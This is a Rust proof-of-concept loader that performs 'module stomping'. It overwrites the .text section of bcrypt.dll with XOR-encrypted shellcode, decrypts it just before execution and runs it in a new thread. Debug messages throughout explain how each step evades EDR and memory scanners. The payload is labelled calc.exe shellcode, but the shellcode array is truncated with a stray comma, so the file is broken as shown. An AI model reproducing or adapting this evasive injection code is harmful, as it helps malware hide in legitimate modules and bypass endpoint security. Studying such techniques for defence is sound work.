use std::ffi::c_void;
use std::mem;
use windows::{
    core::{s, Error, Result},
    Win32::{
        Foundation::{E_FAIL, HMODULE},
        System::{
            LibraryLoader::LoadLibraryA,
            Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS},
            Threading::{CreateThread, THREAD_CREATION_FLAGS},
        },
    },
};

const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;


// PE structures - manually defined since they're not easily accessible in windows crate
#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    pub e_lfanew: i32,
}

#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct IMAGE_FILE_HEADER {
    machine: u16,
    pub number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    pub address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    checksum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageSectionHeader {
    pub name: [u8; 8],
    misc: ImageSectionHeaderMisc,
    pub virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_line_numbers: u32,
    number_of_relocations: u16,
    number_of_line_numbers: u16,
    characteristics: u32,
}

#[repr(C)]
union ImageSectionHeaderMisc {
    physical_address: u32,
    pub virtual_size: u32,
}



#[cfg(any(debug_assertions, feature = "debug_output"))]
macro_rules! debug_print {
    ($($arg:tt)*) => {
        print!($($arg)*);
    };
}

#[cfg(not(any(debug_assertions, feature = "debug_output")))]
macro_rules! debug_print {
    ($($arg:tt)*) => {};
}

#[cfg(any(debug_assertions, feature = "debug_output"))]
macro_rules! debug_println {
    ($($arg:tt)*) => {
        println!($($arg)*);
    };
}

#[cfg(not(any(debug_assertions, feature = "debug_output")))]
macro_rules! debug_println {
    ($($arg:tt)*) => {};
}

const SHELLCODE_ENCRYPTED: [u8; 460] = [
    0x22, 0xE5, 0x3D, 0x0B, 0x3A, 0x16, 0x7A, 0xBE, 0x13, 0x37, 0x81, 0x8F,
  ,
];

const XOR_KEY: [u8; 32] = [
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x13, 0x37, 0xC0, 0xDE, 0xF0, 0x0D, 0xFA, 0xCE,
    0xB0, 0x0B, 0x1E, 0x55, 0xDE, 0xAD, 0xC0, 0xFF,
    0xEE, 0xBA, 0xBE, 0xFA, 0xCE, 0x00, 0x00, 0x00
];

fn decrypt_shellcode_in_place(dest: *mut u8, dest_size: usize) {
    debug_println!("[+] Decrypting shellcode directly to target memory...");
    debug_println!("    *** JUST-IN-TIME DECRYPTION: Minimizing exposure time ***");

    unsafe {
        let shellcode_len = SHELLCODE_ENCRYPTED.len().min(dest_size);

        // Descifrar directamente en la memoria destino
        for i in 0..shellcode_len {
            let decrypted_byte = SHELLCODE_ENCRYPTED[i] ^ XOR_KEY[i % XOR_KEY.len()];
            *dest.add(i) = decrypted_byte;
        }

        // Padding con NOPs si es necesario
        if shellcode_len < dest_size {
            let nop_start = dest.add(shellcode_len);
            std::ptr::write_bytes(nop_start, 0x90, dest_size - shellcode_len);
        }

        debug_println!("[+] Shellcode decryption completed directly to target");
        debug_println!("    Decrypted {} bytes", shellcode_len);
        debug_println!("    Target address: 0x{:X}", dest as usize);
    }
}


fn load_target_dll() -> Result<HMODULE> {
    debug_println!("\n[+] Loading target DLL for MODULE STOMPING...");
    debug_println!("    *** This is TRUE Module Stomping - we will replace the ENTIRE module ***");

    unsafe {
        let dll_handle = LoadLibraryA(s!("bcrypt.dll"))?;

        debug_println!("[+] bcrypt.dll loaded successfully");
        debug_println!("    Module base address: 0x{:X}", dll_handle.0 as usize);
        debug_println!("    STOMP the entire .text section, not just one function");


        Ok(dll_handle)
    }
}


#[repr(C)]
struct TextSectionInfo {
    base_address: *mut c_void,
    size: usize,
    original_entry_point: *mut c_void,
}

fn find_text_section(dll_handle: HMODULE) -> Result<TextSectionInfo> {
    debug_println!("\n[+] Parsing PE headers to locate .text section...");
    debug_println!("    *** MODULE STOMPING: Finding entire .text section to replace ***");

    unsafe {
        let module_base = dll_handle.0 as *const u8;

        // Parse DOS header
        let dos_header = &*(module_base as *const ImageDosHeader);
        debug_println!("    DOS Header found at: 0x{:X}", module_base as usize);

        // Parse NT headers
        let nt_headers = &*((module_base.add(dos_header.e_lfanew as usize)) as *const IMAGE_NT_HEADERS64);
        debug_println!("    NT Headers found at: +0x{:X}", dos_header.e_lfanew);

        // Get original entry point (we'll replace this)
        let original_entry = module_base.add(nt_headers.optional_header.address_of_entry_point as usize) as *mut c_void;
        debug_println!("    Original Entry Point: 0x{:X}", original_entry as usize);

        // Find .text section
        let sections_ptr = nt_headers as *const _ as *const u8;
        let sections_ptr = sections_ptr.add(mem::size_of::<IMAGE_NT_HEADERS64>()) as *const ImageSectionHeader;

        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*sections_ptr.add(i as usize);
            let name = std::ffi::CStr::from_ptr(section.name.as_ptr() as *const i8);

            if name.to_string_lossy().starts_with(".text") {
                let text_base = module_base.add(section.virtual_address as usize) as *mut c_void;
                let text_size = section.misc.virtual_size as usize;

                debug_println!("[+] .text section located successfully");
                debug_println!("    Section name: {}", name.to_string_lossy());
                debug_println!("    Virtual Address: 0x{:X}", text_base as usize);
                debug_println!("    Virtual Size: 0x{:X} ({} bytes)", text_size, text_size);
                debug_println!("    *** ENTIRE SECTION WILL BE REPLACED WITH SHELLCODE ***");

                return Ok(TextSectionInfo {
                    base_address: text_base,
                    size: text_size,
                    original_entry_point: original_entry,
                });
            }
        }

        Err(Error::new(E_FAIL, "Failed to locate .text section"))
    }
}


fn change_memory_protection(address: *mut c_void, size: usize) -> Result<PAGE_PROTECTION_FLAGS> {
    debug_println!("\n[+] Modifying memory protection for MODULE STOMPING...");
    debug_println!("    *** Making ENTIRE .text section WRITABLE (not executable yet) ***");
    debug_println!("    **: Avoiding PAGE_EXECUTE_READWRITE red flag ***");

    unsafe {
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            address,
            size,
            PAGE_PROTECTION_FLAGS(PAGE_READWRITE),  // Solo lectura + escritura (sin ejecución)
            &mut old_protect,
        )?;

        debug_println!("[+] Memory protection changed successfully");
        debug_println!("    Address: 0x{:X}", address as usize);
        debug_println!("    Size: 0x{:X} ({} bytes)", size, size);
        debug_println!("    Previous protection: 0x{:X}", old_protect.0);
        debug_println!("    New protection: PAGE_READWRITE (write only, no execute)");
        debug_println!("    EDR less likely to flag write-only permission change");

        Ok(old_protect)
    }
}

fn make_section_executable(address: *mut c_void, size: usize) -> Result<()> {
    debug_println!("\n[+] Making stomped section executable before execution...");
    debug_println!("    ***: Separate write and execute phases ***");

    unsafe {
        let mut temp_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            address,
            size,
            PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READ),  // Solo lectura + ejecución (sin escritura)
            &mut temp_protect,
        )?;

        debug_println!("[+] Section is now executable");
        debug_println!(" Address: 0x{:X}", address as usize);
        debug_println!(" New protection: PAGE_EXECUTE_READ");
        debug_println!(" .text section permissions restored");
        debug_println!(" Section appears legitimate to memory scanners");

        Ok(())
    }
}


fn prepare_stomping_area(text_info: &TextSectionInfo) {
    debug_println!("\n[+] Preparing MODULE STOMPING area...");
    debug_println!("    *** CLEARING .text SECTION ***");
    debug_println!("    *** Shellcode remains ENCRYPTED until execution ***");

    debug_println!("    Original .text size: 0x{:X} ({} bytes)", text_info.size, text_info.size);
    debug_println!("    Target address: 0x{:X}", text_info.base_address as usize);
    debug_println!("    Current protection: PAGE_READWRITE (safe to write)");

    unsafe {
        // VERIFICACIÓN ANTES: Mostrar bytes originales del módulo
        debug_println!("\n[*] VERIFICATION - Original .text section bytes:");
        debug_print!("    Before clearing: ");
        let original_bytes = std::slice::from_raw_parts(text_info.base_address as *const u8, 16);
        for &byte in original_bytes {
            debug_print!("{:02X} ", byte);
        }
        debug_println!("...");

        // Limpiar toda la sección .text con zeros
        debug_println!("\n    [*] Clearing entire .text section...");
        std::ptr::write_bytes(
            text_info.base_address as *mut u8,
            0,
            text_info.size,
        );
        debug_println!("        Zeroed {} bytes", text_info.size);
        debug_println!("        Section ready for just-in-time decryption");
    }

    debug_println!("[+] Stomping area prepared");
    debug_println!("    .text section cleared and ready");
    debug_println!("    Shellcode still ENCRYPTED in memory");
}


fn decrypt_and_execute_stomped_module(text_info: &TextSectionInfo) -> Result<()> {
    debug_println!("\n[+] JUST-IN-TIME DECRYPTION AND EXECUTION...");
    debug_println!("    *** CRITICAL: Decrypting shellcode NOW ***");
    debug_println!("    *** Minimizing time shellcode exists in clear text ***");

    // PASO 1: Descifrar directamente en la sección .text (aún con permisos RW)
    decrypt_shellcode_in_place(text_info.base_address as *mut u8, text_info.size);

    // PASO 2: Verificación rápida del descifrado
    unsafe {
        debug_print!("    Decrypted bytes: ");
        let decrypted_bytes = std::slice::from_raw_parts(text_info.base_address as *const u8, 16);
        for &byte in decrypted_bytes {
            debug_print!("{:02X} ", byte);
        }
        debug_println!("...");
    }

    // PASO 3: Cambiar inmediatamente a ejecutable
    debug_println!("\n[+] Making section executable IMMEDIATELY after decryption...");
    make_section_executable(text_info.base_address, text_info.size)?;

    debug_println!("\n[+] Executing STOMPED MODULE...");
    debug_println!("    *** Executing from JUST-DECRYPTED .text section ***");

    unsafe {
        // Ejecutar desde el inicio de la sección .text stomped
        let execution_addr = text_info.base_address;

        debug_println!("    Execution will start from: 0x{:X}", execution_addr as usize);
        debug_println!("    Shellcode was decrypted milliseconds ago");
        debug_println!("    Minimal exposure time in memory");
        debug_println!("    EVASION: Section now has normal .text permissions (PAGE_EXECUTE_READ)");

        // Crear thread para ejecutar nuestro código stomped
        CreateThread(
            None,
            0,
            Some(std::mem::transmute(execution_addr)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )?;

        debug_println!("[+] Thread created successfully");
        debug_println!("    Now executing freshly decrypted shellcode");
        debug_println!("    Time from decryption to execution: < 1ms");

        // Esperar un momento para que el shellcode se ejecute
        std::thread::sleep(std::time::Duration::from_secs(3));

        Ok(())
    }
}


fn print_stomping_info(text_info: &TextSectionInfo, dll_handle: HMODULE) {
    debug_println!("\n[*] MODULE STOMPING VERIFICATION:");
    debug_println!("    *** COMPLETE MODULE REPLACEMENT ANALYSIS ***");

    // Información del stomping
    debug_println!("    Target Module: bcrypt.dll");
    debug_println!("    Stomped Section: .text");
    debug_println!("    Section Address: 0x{:016X}", text_info.base_address as usize);
    debug_println!("    Section Size: 0x{:X} ({} bytes)", text_info.size, text_info.size);
    debug_println!("    Encrypted Shellcode Size: {} bytes", SHELLCODE_ENCRYPTED.len());
    debug_println!("    Original Entry Point: 0x{:X}", text_info.original_entry_point as usize);

    // Calcular offset dentro de la DLL
    let dll_base = dll_handle.0 as usize;
    let section_addr = text_info.base_address as usize;
    let offset = section_addr - dll_base;
    debug_println!("    Section Offset: +0x{:X} from DLL base", offset);

    unsafe {
        // Verificación final del stomping - mostrar los bytes actuales (ya descifrados y ejecutándose)
        let memory_content = std::slice::from_raw_parts(
            text_info.base_address as *const u8,
            16.min(text_info.size)
        );

        // Mostrar bytes actuales en memoria (ya descifrados)
        debug_print!("    Current memory (decrypted): ");
        for &byte in memory_content {
            debug_print!("{:02X} ", byte);
        }
        debug_println!("...");

        // Verificar que el resto de la sección tiene NOPs
        if text_info.size > SHELLCODE_ENCRYPTED.len() {
            let padding_start = (text_info.base_address as *const u8).add(SHELLCODE_ENCRYPTED.len());
            let padding_sample = std::slice::from_raw_parts(padding_start, 8.min(text_info.size - SHELLCODE_ENCRYPTED.len()));
            debug_print!("    Padding:                    ");
            for &byte in padding_sample {
                debug_print!("{:02X} ", byte);
            }
            debug_println!("... (rest of section)");
        }
    }

    debug_println!("\n    [*] STOMPING SUMMARY:");
    debug_println!("        - Original module code: COMPLETELY ERASED");
    debug_println!("        - New module behavior: FULLY CONTROLLED");
    debug_println!("        - Module appears legitimate to OS");
    debug_println!("        - All original functionality: LOST");
}


// ==================== FUNCIÓN PRINCIPAL ====================
fn main() -> Result<()> {
    debug_println!("\n==================== MODULE STOMPING POC ====================\n");
    debug_println!("Target DLL: bcrypt.dll (.text section)");
    debug_println!("Payload: calc.exe shellcode (XOR encrypted)");
    debug_println!("Technique: TRUE MODULE STOMPING with JUST-IN-TIME decryption");
    debug_println!("APIs: Modern Windows crate with PE parsing\n");

    debug_println!("[*] ENHANCED TECHNIQUE EXPLANATION:");
    debug_println!("    - Load legitimate DLL (bcrypt.dll)");
    debug_println!("    - Parse PE headers to find .text section");
    debug_println!("    - Clear .text section (shellcode remains ENCRYPTED)");
    debug_println!("    - Decrypt shellcode JUST BEFORE execution");
    debug_println!("    - Execute immediately after decryption");
    debug_println!("    - Minimal exposure time of clear-text shellcode\n");

    // PASO 1: Cargar DLL legítima para stomping
    let dll_handle = load_target_dll()?;

    // PASO 2: Encontrar sección .text completa (NO solo una función)
    let text_info = find_text_section(dll_handle)?;

    // PASO 3: Cambiar permisos de TODA la sección .text a RW
    let _old_protect = change_memory_protection(text_info.base_address, text_info.size)?;

    // PASO 4: Preparar área de stomping (limpiar sección)
    prepare_stomping_area(&text_info);

    // PASO 5: CRÍTICO - Descifrar y ejecutar inmediatamente
    // El shellcode se descifra JUSTO ANTES de ejecutarse
    debug_println!("\n[*] CRITICAL PHASE: Just-in-time decryption and execution");
    debug_println!("    Shellcode has been ENCRYPTED until this moment");
    decrypt_and_execute_stomped_module(&text_info)?;

    debug_println!("\n[+] MODULE STOMPING execution completed successfully");
    debug_println!("The entire .text section of bcrypt.dll is now running our code");
    debug_println!("Shellcode was decrypted JUST BEFORE execution\n");

    // Información detallada del stomping
    print_stomping_info(&text_info, dll_handle);


    println!("\nPress ENTER to exit...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();

    Ok(())
}

